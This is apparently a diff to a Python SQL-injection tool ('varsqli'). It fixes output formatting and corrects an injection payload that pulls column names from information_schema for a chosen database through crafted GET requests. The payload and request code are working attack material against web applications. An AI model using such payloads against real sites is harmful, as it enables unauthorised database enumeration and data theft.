@@ -1,3 +1,4 @@
+# V2.1.15 - Pro 
 import requests
 import argparse
 import re
@@ -380,7 +381,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 print("|", tables_name)
                                                 time.sleep(0.30)
                                             print("+----------------------------+")
-                                            print("Find {} Tables")
+                                            print("Find {} Tables".format(num_tab))
                                             print("")
                                             exit()
                                 else:
@@ -407,7 +408,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                             find_checkings = r"\b\w+::\b"
                                             find_alls = re.findall(find_checkings, html_contents)
 
-                                            payload_get_tables = f"(SELECT GROUP_CONCAT(column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns FROM users WHERE table_schema='{args.DB}')"
+                                            payload_get_tables = f"(SELECT GROUP_CONCAT(column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
                                             split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                             get_content = requests.get(url + split_num)
                                             html_content = get_content.text
@@ -428,7 +429,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 print("|", tables_name)
                                                 time.sleep(0.30)
                                             print("+----------------------------+")
-                                            print("Find {} Tables")
+                                            print("Find {} Columns".format(num_tab))
                                             print("")
                                             exit()
                                 else:
@@ -581,7 +582,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 print("|", tables_name)
                                                 time.sleep(0.30)
                                             print("+----------------------------+")
-                                            print("Find {} Tables")
+                                            print("Find {} Tables".format(num_tab))
                                             print("")
                                             exit()
                                 else:
@@ -628,7 +629,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 print("|", tables_name)
                                                 time.sleep(0.30)
                                             print("+----------------------------+")
-                                            print("Find {} Tables")
+                                            print("Find {} Columns".format(num_tab))
                                             print("")
                                             exit()
                                 else:
